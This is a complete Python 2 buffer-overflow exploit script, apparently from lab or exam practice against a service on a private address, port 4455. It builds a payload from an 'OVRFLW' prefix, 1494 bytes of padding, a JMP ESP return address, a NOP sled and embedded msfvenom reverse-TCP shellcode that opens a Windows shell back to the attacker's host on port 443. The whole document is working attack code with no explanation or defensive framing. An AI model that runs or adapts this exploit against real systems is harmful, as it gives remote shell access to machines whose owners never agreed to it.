#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.1.59"
RPORT = 4455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

tolen_buf = 3000
offset_rsp = 1494
ptr_jmp_esp = 0x56526683


badchar_test = "" 			    #start with empty string
badchars = [0x00, 0x0A]			#every time bad...
badchars += [0x04, 0x38]

#payload generated with msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.59 LPORT=443 -f c -b '\x00\x0A\x04\x38' -f c

buf = ("\xb8\x07\x94\x24\xe6\xdb\xd7\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\x44\x9a\xc6\x13\xb6\x4a\x84"
"\xdc\x46\x8b\xe9\x55\xa3\xba\x29\x01\xa0\xed\x99\x41\xe4\x01"
"\x51\x07\x1c\x91\x17\x80\x13\x12\x9d\xf6\x1a\xa3\x8e\xcb\x3d"
"\x27\xcd\x1f\x9d\x16\x1e\x52\xdc\x5f\x43\x9f\x8c\x08\x0f\x32"
"\x20\x3c\x45\x8f\xcb\x0e\x4b\x97\x28\xc6\x6a\xb6\xff\x5c\x35"
"\x18\xfe\xb1\x4d\x11\x18\xd5\x68\xeb\x93\x2d\x06\xea\x75\x7c"
"\xe7\x41\xb8\xb0\x1a\x9b\xfd\x77\xc5\xee\xf7\x8b\x78\xe9\xcc"
"\xf6\xa6\x7c\xd6\x51\x2c\x26\x32\x63\xe1\xb1\xb1\x6f\x4e\xb5"
"\x9d\x73\x51\x1a\x96\x88\xda\x9d\x78\x19\x98\xb9\x5c\x41\x7a"
"\xa3\xc5\x2f\x2d\xdc\x15\x90\x92\x78\x5e\x3d\xc6\xf0\x3d\x2a"
"\x2b\x39\xbd\xaa\x23\x4a\xce\x98\xec\xe0\x58\x91\x65\x2f\x9f"
"\xd6\x5f\x97\x0f\x29\x60\xe8\x06\xee\x34\xb8\x30\xc7\x34\x53"
"\xc0\xe8\xe0\xf4\x90\x46\x5b\xb5\x40\x27\x0b\x5d\x8a\xa8\x74"
"\x7d\xb5\x62\x1d\x14\x4c\xe5\xe2\x41\x4f\xce\x8a\x93\x4f\x31"
"\xf0\x1d\xa9\x5b\x16\x48\x62\xf4\x8f\xd1\xf8\x65\x4f\xcc\x85"
"\xa6\xdb\xe3\x7a\x68\x2c\x89\x68\x1d\xdc\xc4\xd2\x88\xe3\xf2"
"\x7a\x56\x71\x99\x7a\x11\x6a\x36\x2d\x76\x5c\x4f\xbb\x6a\xc7"
"\xf9\xd9\x76\x91\xc2\x59\xad\x62\xcc\x60\x20\xde\xea\x72\xfc"
"\xdf\xb6\x26\x50\xb6\x60\x90\x16\x60\xc3\x4a\xc1\xdf\x8d\x1a"
"\x94\x13\x0e\x5c\x99\x79\xf8\x80\x28\xd4\xbd\xbf\x85\xb0\x49"
"\xb8\xfb\x20\xb5\x13\xb8\x51\xfc\x39\xe9\xf9\x59\xa8\xab\x67"
"\x5a\x07\xef\x91\xd9\xad\x90\x65\xc1\xc4\x95\x22\x45\x35\xe4"
"\x3b\x20\x39\x5b\x3b\x61")

payload = "OVRFLW"
payload += "A" * offset_rsp 
payload += struct.pack("<I", ptr_jmp_esp) 
payload += '\x90'*20
payload += buf
payload += "D" * (tolen_buf - len(payload)) 
payload += "\r\n"

s.send(payload)
s.recv(1024)
s.close()
